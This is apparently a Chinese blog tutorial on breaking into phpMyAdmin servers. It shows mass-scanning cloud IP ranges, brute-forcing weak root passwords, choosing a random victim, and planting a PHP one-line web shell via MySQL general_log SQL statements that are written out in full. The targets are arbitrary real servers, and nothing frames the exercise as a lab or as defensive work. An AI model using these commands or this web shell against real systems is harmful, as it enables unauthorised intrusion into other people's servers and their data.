前段时间写了个phpmyadmin提权的教程,很多人都说现在那里还有root帐号root密码这种弱口令，今天给大家来一套完整的教学。

  

  

首先百度XX云X地区的IP段（你要是连几个国内云服务运营商的名字都不知道，那我就真的没办法了）。

  

![](../Images/9b8c838aa097a784515e6a5f67c759b6.png)   

  

找到以后百度随便找个工具扫描IP段，大的运营商一般直接后两个大段都是他的

  

  

然后找到IP段以后直接找一个80端口批量扫描的工具扫80端口，直接扫两个大段

  

  

我用的这个叫S-Xing，百度来的，不知道有没有后门，所以就不提供了

  

![](../Images/46d014426bca5ca04facc2a43567d455.png) ![](../Images/7217b04f3e9a293228d48aa1d8650850.png)   

  

扫描好以后导入刚才扫描好的IP

  

![](../Images/66b3f78dc85fce62cb70745d579bfb4f.png)   

  

然后选择自动后缀

  

![](../Images/42ee85acf48da58fd3785a8bdd4a8878.png)   

  

线程根据自己配置来配置，我直接选择最高500，然后开始爆破

  

  

![](../Images/ee3b3b7ea3e1bf4a1225be64cf8a34e9.png)   

  

爆破结果

  

![](../Images/fb07c435aa3bbba395dc249d214f25e5.png)   

  

随便选择一个开搞

  

先看一下服务器信息xx.xx.xx.xx/l.php

  

![](../Images/063923f756024f82b8da508627a7c7db.png)

   

网站路径什么的都爆出来了，登录后台

  

![](../Images/8251041f5fcb299476f6fd40bf1fba14.png)

   

老规矩，查下mysql日志文件路径

  

![](../Images/e5120e6dd91bcd6333b32dbdeed9aef7.png)   

先修改日志路径到当前网站路径，在开启日志，并插入一句话木马，然后关闭日志

  

SET global general\_log\_file= C:/phpStudy/PHPTutorial/WWW/sean.php ; 

  

修改当前日志文件到网站目录下

  

set global general\_log = "ON";                开启mysql记录日志

select  <?php eval($\_POST\[sean\]);?> ;   插入PHP        一句话木马

set global general\_log = "OFF";              关闭mysql记录日志

  

![](../Images/ed8bdc842476e38f17bea394f0c6df6a.png)   

  

执行成功

  

![](../Images/a5cf2bc4123e8aa68df21533571349fe.png)
